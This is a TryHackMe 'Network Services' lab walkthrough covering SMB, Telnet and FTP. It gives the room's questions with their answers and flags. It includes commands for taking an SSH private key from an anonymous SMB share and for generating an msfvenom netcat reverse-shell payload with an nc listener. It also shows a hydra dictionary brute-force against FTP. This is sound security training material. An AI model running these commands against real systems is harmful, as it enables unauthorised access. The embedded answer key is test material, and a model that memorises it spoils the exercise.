# TryHackMe walkthrough

## Network Services

> _tihawk | May 13, 2021_

----------------------------------------

### TASK 1. Get Connected

<p>Hello and welcome!</p><p>This room will explore common Network Service vulnerabilities and misconfigurations, but in order to do 
that, we'll need to do a few things first!</p><p>A basic knowledge of 
Linux, and how to navigate the Linux file system, is required for this 
room. If you think you'll need some help with this, try completing the 
'Linux Fundamentals' Module<a href="https://tryhackme.com/module/linux-fundamentals"> (https://tryhackme.com/module/linux-fundamentals)</a></p><ol><li>Connect to the TryHackMe OpenVPN Server (See <a href="https://tryhackme.com/access">https://tryhackme.com/access</a> for help!)</li><li>Make sure you're sitting comfortably, and have a cup of Tea, Coffee or Water close!</li></ol>Now, let's move on!<br /><br /><p><b>N.B.</b> This is not<b> </b>a room on WiFi access hacking or hijacking, rather how to gain unauthorized access to a machine by exploiting network services. If you are interested in WiFi hacking, I suggest checking out WiFi Hacking 101 by NinjaJc01 (<a href="https://tryhackme.com/room/wifihacking101">https://tryhackme.com/room/wifihacking101</a>)</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Ready? Let's get going!<br />

```
OK
```

----------------------------------------

### TASK 2. Understanding SMB

<p><b>What is SMB?</b></p><p>SMB - Server Message Block Protocol -  is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network. [<a href="https://searchnetworking.techtarget.com/definition/Server-Message-Block-Protocol">source</a>]<br /></p><p>Servers make file systems and other resources (printers,
named pipes, APIs) available to clients on the network. Client
computers may have their own hard disks, but they also want access
to the shared file systems and printers on the servers.
</p><p>The SMB protocol is known as a response-request protocol, meaning that 
it transmits multiple messages between the client and server to 
establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over
TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.
</p><p><b>How does SMB work?</b><br /></p><p><img src="https://i.imgur.com/XMnru12.png" style="float:left;width:360px;height:161.124px;" align="LEFT" /></p><p><br /></p><p><br /></p><p><br /></p><p><br /><br /></p><p>Once they have established a connection, clients can then send
commands (SMBs) to the server that allow them to access shares,
open files, read and write files, and generally do all the sort
of things that you want to do with a file system. However, in
the case of SMB, these things are done over the network.
</p><p><b>What runs SMB?</b></p><p>Microsoft Windows operating systems since Windows 95 have included client and server SMB protocol support. Samba, an open source server that supports the SMB protocol, was released for Unix systems.<br /></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. <p>What does SMB stand for?    <br /></p>

```
Server Message Block
```

2. <p>What type of protocol is SMB?    <br /></p>

```
response-request
```

3. <p>What do clients connect to servers using?    <br /></p>

```
TCP/IP
```

4. <p>What systems does Samba run on?<br /></p>

```
Unix
```

----------------------------------------

### TASK 3. Enumerating SMB

<p><b>Lets Get Started</b></p><p>Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!</p><p><img src="https://image.flaticon.com/icons/svg/2879/2879093.svg" style="width:205.094px;height:205.094px;margin:0px;float:left" /></p><p><b>Enumeration</b></p><p>Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.</p><p>
 This process is essential for an attack to be successful, as wasting 
time with exploits that either don't work or can crash the system can be a waste of energy. Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services, or any other information that may be valuable to an attacker.</p><p><b>SMB</b><br /></p><p>Typically, there are SMB share drives on a server
 that can be connected to and used to view or transfer files. SMB can 
often be a great starting point for an attacker looking to discover 
sensitive information — you'd be surprised what is sometimes included on
 these shares. <br /></p><p></p><p><b><br /></b></p><p><b>Port Scanning</b></p><p>The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, applications, structure and operating system of the target machine. You can go as in depth as you like on this, however I suggest using <b>nmap</b> with the <b>-A</b> and <b>-p-</b> tags.</p><p>-A : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one<br /></p><p>-p- : Enables scanning across all ports, not just the top 1000</p><p>If you'd like to learn more about nmap in more detail, I <b>recommend</b> checking out DarkStar's room on the topic, as part of the Red Primer series <a href="https://tryhackme.com/room/furthernmap" target="_blank">here</a>.</p><p><b>Enum4Linux</b></p><p>Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB. It's installed by default on Parrot and Kali, however if you need to install it, you can do so from the official <a href="https://github.com/portcullislabs/enum4linux">github</a>. </p><p>The syntax of Enum4Linux is nice and simple: <b>"enum4linux [options] ip"</b><br /></p><p><b>TAG</b>            <b>FUNCTION</b><br /></p><p>-U             get userlist<br />-M             get machine list<br />-N             get namelist dump (different from -U and-M)<br />-S             get sharelist<br />-P             get password policy information<br />-G             get group and member list</p><p>-A             all of the above (full basic enumeration)<br /></p><p><b> </b>Now we understand our enumeration tools, let's get started!<br /></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Conduct an <b>nmap</b> scan of your choosing, How many ports are open?<br />

```
3
```

2. <p>What ports is <b>SMB</b> running on? </p>

```
139/445
```

3. <p>Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the <b>workgroup </b>name?    <br /></p>

```
WORKGROUP
```

4. <p>What comes up as the <b>name</b> of the machine?        <br /></p>

```
POLOSMB
```

5. <p>What operating system <b>version</b> is running?    <br /></p>

```
6.1
```

6. <p>What share sticks out as something we might want to investigate?    <br /></p>

```
profiles
```

----------------------------------------

### TASK 4. Exploiting SMB

<p><b>Types of SMB Exploit<br /></b></p><p>While there are vulnerabilities such as <a href="https://www.cvedetails.com/cve/CVE-2017-7494/">CVE-2017-7494</a>
 that can allow remote code execution by exploiting SMB, you're more 
likely to encounter a situation where the best way into a system is due to <span><span>misconfigurations</span></span> in the system. In this case, we're going to be exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.<br /></p><p><b>Method Breakdown</b><img src="https://image.flaticon.com/icons/svg/2864/2864751.svg" style="width:371px;height:371px;margin:0px;float:right" /></p><p>So, from our enumeration stage, we know:</p><p>    - The SMB share location</p><p>    - The name of an interesting SMB share<br /></p><p><b>SMBClient </b></p><p>Because we're trying to access an SMB share, we need a client to access resources
	on servers. We will be using SMBClient<b> </b>because it's part of the default samba suite. While it is available by default on Kali and Parrot, if you do need to install it, you can find the documentation <a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">here.</a> </p><p>We can remotely access the SMB share using the syntax:</p><p> <code>smbclient //[IP]/[SHARE]</code><b></b> </p><p>Followed by the tags:</p><p>-U [name] : to specify the user</p><p>-p [port] : to specify the port<br /></p><p> </p><p><b>Got it? Okay, let's do this!</b><br /></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?<br />

```
smbclient //10.10.10.2/secret -U suit -p 445
```

2. Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability. <br />

```
OK
```

3. <p>Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by: </p><p>- using the username "Anonymous"</p><p>- connecting to the share we found during the enumeration stage</p><p>- and not supplying a password. </p><p>Does the share allow anonymous access? Y/N?<br /></p>

```
Y
```

4. Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to? <br />

```
John Cactus
```

5. <p>What service has been configured to allow him to work from home?<br /></p>

```
ssh
```

6. <p>Okay! Now we know this, what directory on the share should we look in?<br /></p>

```
.ssh
```

7. <p>This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?<br /></p>

```
id_rsa
```

8. <p>Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]". </p><p>Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.</p><p>What is the smb.txt flag?<br /></p>

```
THM{smb_is_fun_eh?}
```

----------------------------------------

### TASK 5. Understanding Telnet

<p><img src="https://st4.depositphotos.com/27867620/30767/v/450/depositphotos_307670056-stock-illustration-computers-web-icon-simple-illustration.jpg" style="width:329px;height:329px;margin:0px;float:right;" /><b>What is Telnet?</b></p><p>Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server. <br /></p><p>The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.<br /></p><p><b>Replacement</b><br /></p><p>Telnet sends all messages in clear text and has no specific security 
mechanisms. Thus, in many applications and services, Telnet has been 
replaced by SSH in most implementations.<br /> <br /><b><b>How does Telnet work?</b></b></p><p>The user connects to the server by using the Telnet protocol, which 
means entering <b>"telnet"</b> into a command prompt. The user then executes commands on the server by 
using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax:<b> "telnet [ip] [port]"</b></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. <p>What is Telnet?    <br /></p>

```
application protocol
```

2. <p>What has slowly replaced Telnet?    <br /></p>

```
ssh
```

3. How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?<br />

```
telnet 10.10.10.3 23
```

4. The lack of what, means that all Telnet communication is in plaintext?<br />

```
encryption
```

----------------------------------------

### TASK 6. Enumerating Telnet

<p><b>Lets Get Started</b></p><p>Before we begin, make sure to deploy 
the room and give it some time to boot. Please be aware, this can take 
up to five minutes so be patient!</p><p><b>Enumeration</b></p><p>We've already seen how key enumeration can be in exploiting a misconfigured network service. However, vulnerabilities that could be potentially trivial to exploit don't always jump out at us. For that reason, especially when it comes to enumerating network services, we need to be thorough in our method.  </p><p><b>Port Scanning</b></p><p>Let's start out the same way we usually do, a port scan, to find out as much information as we can about 
the services, applications, structure and operating system of the target
 machine. Scan the machine with <b>nmap</b> and the tag<b> -A and -p-</b>.<br /></p><p><b>Tag</b><br /></p><p>-A : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one</p><p>-p- : Enables scanning across all ports, not just the top 1000 </p><p><b>Output</b></p><p>Let's see what's going on on the target server...<br /><b></b><br /></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. <p>How many <b>ports</b> are open on the target machine?    <br /></p>

```
1
```

2. <p>What <b>port</b> is this?<br /></p>

```
8012
```

3. <p>This port is unassigned, but still lists the <b>protocol</b> it's using, what protocol is this?      <br /></p>

```
tcp
```

4. <p>Now re-run the <b>nmap</b> scan, without the <b>-p-</b> tag, how many ports show up as open?<br /></p>

```
0
```

5. <p>Here, we see that by assigning telnet to a <b>non-standard port</b>, it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage. <br /></p>

```
OK
```

6. Based on the title returned to us, what do we think this port could be <b>used for</b>?<br />

```
a backdoor
```

7. Who could it belong to? Gathering possible <b>usernames</b> is an important step in enumeration.<br />

```
Skidy
```

8. <p>Always keep a note of information you find during your enumeration 
stage, so you can refer back to it when you move on to try exploits.</p>

```
OK
```

----------------------------------------

### TASK 7. Exploiting Telnet

<p><b>Types of Telnet Exploit<br /></b></p><p>Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:</p><ul><li><a href="https://www.cvedetails.com/">https://www.cvedetails.com/</a></li><li><a href="https://cve.mitre.org/">https://cve.mitre.org/</a><a href="https://cve.mitre.org/"></a></li></ul><p>A CVE, short for Common Vulnerabilities and Exposures, is a list of 
publicly disclosed computer security flaws. When someone refers to a 
CVE, they usually mean the CVE ID number assigned to a security flaw.</p><p>However, you're far more likely to find a misconfiguration in how telnet has been configured or is operating that will allow you to exploit it. </p><p><b>Method Breakdown</b></p><p>So, from our enumeration stage, we know:</p><p>    - There is a poorly hidden telnet service running on this machine</p><p>    - The service itself is marked "backdoor"</p><p>    - We have possible username of "Skidy" implicated</p><p>Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!</p><p><b>Connecting to Telnet</b></p><p>You can connect to a telnet server with the following syntax: </p><p>    <b>"telnet [ip] [port]"</b></p><p>We're going to need to keep this in mind as we try and exploit this machine.<br /><b></b><br /><b></b></p><p><b>What is a Reverse Shell?</b></p><p><b><img src="https://i.imgur.com/EUC7VS6.png" style="width:506.003px;margin:0px;float:right;height:132.094px" /></b></p><p>A <b>"shell"</b> can simply be described as a piece of code or program which can be
 used to gain code or command execution on a device.</p><p>A reverse shell is a type of shell in which the target machine 
communicates back to the attacking machine.</p><p> The attacking machine has a 
listening port, on which it receives the connection, resulting in code 
or command execution being achieved.</p><p></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. <p>Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.<br /></p>

```
OK
```

2. <p>Great! It's an open telnet connection! What welcome message do we receive? <br /></p>

```
SKIDY'S BACKDOOR.
```

3. <p>Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)<br /></p>

```
N
```

4. <p>Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command. <br /></p>

```
OK
```

5. <p>Start a tcpdump listener on your local machine.</p><p><b>If using your own machine with the OpenVPN connection, use:</b><br /></p><ul><li><code>sudo tcpdump ip proto \\icmp -i tun0</code></li></ul><p><b>If using the AttackBox, use:</b></p><ul><li><code>sudo tcpdump ip proto \\icmp -i eth0</code></li></ul><p>This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.<br /></p>

```
OK
```

6. <p>Now, use the command <b>"ping [local THM ip] -c 1" </b>through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)<br /></p>

```
Y
```

7. <p>Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!<br /></p>

```
OK
```

8. <p>We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:<br /></p><div style="font-size:14px;line-height:17px;-moz-tab-size:4;-o-tab-size:4;-webkit-tab-size:4;tab-size:4"><div><b><span>"msfvenom</span><span> </span><span>-</span><span>p</span><span> </span><span>cmd</span><span>/</span><span>unix</span><span>/</span><span>reverse_netcat </span><span>lhost</span><span>=[local tun0 ip]</span><span></span><span> </span><span>lport</span><span>=</span><span>4444</span><span> </span><span>R"</span></b></div><div><b><span><br /></span></b></div><div><span>-p = payload</span></div><div>lhost = our local host IP address (this is <b>your</b> machine's IP address)</div><div>lport = the port to listen on (this is the port on <b>your </b>machine)</div><div><span>R = export the payload in raw format<br /></span></div><div><span><br /></span></div><div><span>What word does the generated payload start with?<br /></span><b><span></span></b></div><div><span><br /></span></div></div>

```
mkfifo
```

9. <p>Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:</p><p><b>"nc -lvp [listening port]" </b></p><p>What would the command look like for the listening port we selected in our payload?<br /><b></b><br /></p>

```
nc -lvp 4444
```

10. <p>Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!<br /></p>

```
OK
```

11. <p>Success! What is the contents of flag.txt?<br /></p>

```
THM{y0u_g0t_th3_t3ln3t_fl4g}
```

----------------------------------------

### TASK 8. Understanding FTP

<p></p><p></p><p><b><img src="https://cdn4.iconfinder.com/data/icons/computer-technology-31/100/technology-14-512.png" style="width:176.5px;margin:0px;float:right;height:176.5px;" /></b><b>What is FTP?</b></p><p>File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way.<br /></p><p><b><b>How does FTP work?</b></b></p><span>A
 typical FTP session operates using two channels: </span><ul><li><span>a command (sometimes called the control)
 channel </span></li><li><span>a data channel. </span></li></ul><p><span>As their names imply, the command channel 
is used for transmitting commands as well as replies to those commands, 
while the data channel is used for transferring data. </span></p><p>FTP operates using a client-server protocol.<span>
 The client initiates a connection with the server, the server validates
 whatever login credentials are provided and then opens the session. </span></p><p><span>While the session is open, the client may execute FTP commands 
on the server. <br /></span></p><p><b>Active vs Passive</b></p><p>The FTP server may support either Active or Passive connections, or both.  </p><ul><li>In an Active FTP connection, the client opens a port and 
listens. The server is required to actively connect to it.  </li><li>In a Passive FTP 
connection, the server opens a port and listens (passively) and the 
client connects to it.  </li></ul>This separation of command 
information and data into separate channels is a way of being able to 
send commands to the server without having 
to wait for the current data transfer to finish. If both channels were 
interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections. <p></p><p></p><p><b>More Details:</b></p><p>You can find more details on the technical function, and implementation of, FTP on the <span>Internet Engineering Task Force website: </span><a href="https://www.ietf.org/rfc/rfc959.txt" target="_blank">https://www.ietf.org/rfc/rfc959.txt</a>. The IETF is one of a number of standards agencies, who define and regulate internet standards. <br /><br /></p><p></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. <p>What communications model does FTP use?<br /></p>

```
client-server
```

2. <p>What's the standard FTP port?<br /></p>

```
21
```

3. <p>How many modes of FTP connection are there?    <br /></p>

```
2
```

----------------------------------------

### TASK 9. Enumerating FTP

<p></p><p></p><p><b>Lets Get Started</b></p><p>Before we begin, make sure to deploy 
the room and give it some time to boot. Please be aware, this can take 
up to five minutes so be patient!</p><p><b><img src="https://cdn4.iconfinder.com/data/icons/database-and-server-pixel-prefect-set-3/80/network__computer__connection__sharing_-512.png" style="width:135.094px;margin:0px;float:left;height:135.094px" />Enumeration</b></p><p>By now, I don't think I need to explain any further how enumeration is key when attacking network services and protocols. You should, by now, have enough experience with <b>nmap </b>to be able to port scan effectively. If you get stuck using any tool- you can always use <b>"tool [-h / -help / --help]"</b> to find out more about it's function and syntax. Equally, man pages are extremely useful for this purpose. They can be reached using <b>"man [tool]"</b>.</p><b>Method</b><p></p><p></p><p>We're going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system. This is a common pathway in CTF challenges, and mimics a real-life careless implementation of FTP servers. </p><p><b>Resources</b></p><p>As we're going to be logging in to an FTP server, we're going to need to make sure therre is an ftp client installed on the system. There should be one installed by default on most Linux operating systems, such as Kali or Parrot OS. You can test if there is one by typing "ftp" into the console. If you're bought to a prompt that says: "ftp&gt;" Then you have a working FTP client on your system. If not, it's a simple matter of using "sudo apt install ftp" to install one. <br /></p><b>Alternative Enumeration Methods</b><p></p><p>It's worth noting  that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the "cwd" command for
 home directories which exist and those that don’t. This can be exploited because you can issue cwd commands before authentication, and if there's a home directory- there is more than likely a user account to go with it. While this bug is found mainly within legacy systems, it's worth knowing about, as a way to exploit FTP.<br /></p><p>This vulnerability is documented at: <a href="https://www.exploit-db.com/exploits/20745">https://www.exploit-db.com/exploits/20745</a>  </p><p><br /></p><p>Now we understand our toolbox, let's do this.                  <br /><b></b></p><p></p><p></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. <p>Run an <b>nmap</b> scan of your choice.</p><p>How many <b>ports</b> are open on the target machine?  <br /></p>

```
2
```

2. <p>What <b>port</b> is ftp running on?<br /></p>

```
21
```

3. <p>What <b>variant </b>of FTP is running on it?   </p>

```
vsftpd
```

4. <p>Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing "<i>ftp [IP]</i>" into the console, and entering "anonymous", and no password when prompted.</p><p>What is the name of the file in the anonymous FTP directory?<br /></p><p><br /></p>

```
PUBLIC_NOTICE.txt
```

5. What do we think a possible username <br />could be?<br />

```
mike
```

6. <p>Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that...<br /><span></span></p>

```
OK
```

----------------------------------------

### TASK 10. Exploiting FTP

<p><b>Types of FTP Exploit</b></p><p><span><img src="https://webstockreview.net/images/lock-clipart-broken-lock-5.png" style="width:25%;margin:0px;float:right" />Similarly to Telnet, when using
 FTP both the command and data channels are unencrypted. Any data sent 
over these channels can be intercepted and read.</span></p><p>With data from FTP being sent in plaintext, if a man-in-the-middle attack took place an attacker could reveal anything sent through this protocol (such as passwords). An article written by <a href="https://www.jscape.com/blog/bid/91906/Countering-Packet-Sniffers-Using-Encrypted-FTP" target="_blank">JSCape</a> demonstrates and explains this process using ARP-Poisoning to trick a victim into sending sensitive information to an attacker, rather than a legitimate source.</p><p><span>When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations. <br /></span></p><p><b>Method Breakdown</b></p><p>So, from our enumeration stage, we know:</p><p>    - There is an FTP server running on this machine<br /></p><p>    - We have a possible username<br /></p><p>Using this information, let's try and <b>bruteforce</b> the password of the FTP Server. </p><p><b>Hydra</b></p><p>Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub <a href="https://github.com/vanhauser-thc/thc-hydra">here</a>.<br /> </p><p>The syntax for the command we're going to use to find the passwords is this:</p><b>"hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp"</b><p></p><p>Let's break it down:</p><p>SECTION             FUNCTION<br /><br />hydra                   Runs the hydra tool<br /><br />-t 4                    Number of parallel connections per target<br /><br />-l [user]               Points to the user who's account you're trying to compromise<br /><br />-P [path to dictionary] Points to the file containing the list of possible passwords<br /><br />-vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt<br /><br />[machine IP]            The IP address of the target machine<br /><br />ftp / protocol          Sets the protocol</p><p>Let's crack some passwords!<br /></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. <p>What is the password for the user "mike"?<br /></p>

```
password
```

2. <p>Bingo! Now, let's connect to the FTP server as this user using <b>"ftp [IP]" </b>and entering the credentials when prompted <br /></p>

```
OK
```

3. <p>What is ftp.txt?<br /></p>

```
THM{y0u_g0t_th3_ftp_fl4g}
```

----------------------------------------

### TASK 11. Expanding Your Knowledge 

<p><b>Further Learning</b></p><p>There is no checklist of things to 
learn until you've officially learnt everything you can. There will 
always be things that surprise us all, especially in the sometimes 
abstract logical problems of capture the flag challenges. But, as with 
anything, practice makes perfect. We can all look back on the things 
we've learnt after completing something challenging and I hope you feel 
the same about this room.</p><p><b>Reading</b></p><p>Here's some things that might be useful to read after completing this room, if it interests you:</p><ul><li><a href="https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef">https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef</a> </li><li><a href="https://attack.mitre.org/techniques/T1210/">https://attack.mitre.org/techniques/T1210/</a></li><li><a href="https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/">https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/</a></li></ul><p><b>Thank you</b><br /></p><p>Thanks for taking the time to work through this room, I wish you the best of luck in future.</p>~ Polo

----------------------------------------

### QUESTIONS:

----------------------------------------

1. <p>Well done, you did it!<br /></p>

```
OK
```

